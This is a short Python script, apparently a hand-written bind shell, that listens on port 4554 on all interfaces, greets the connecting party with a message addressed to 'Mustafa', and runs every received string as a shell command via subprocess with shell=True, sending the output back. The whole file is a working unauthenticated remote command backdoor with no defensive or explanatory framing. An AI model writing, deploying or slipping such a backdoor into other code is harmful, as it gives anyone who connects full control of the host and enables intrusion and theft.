import socket
import subprocess
ip = "0.0.0.0"
port = 4554
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((ip,port))  
s.listen(1)
d = "[+] Listening Mode Active Mustafa..."
c,addr = s.accept()
c.send(d)
while True:    
    command = c.recv(1024)
    Gonder = subprocess.check_output(command,shell=True)
    c.send(Gonder)
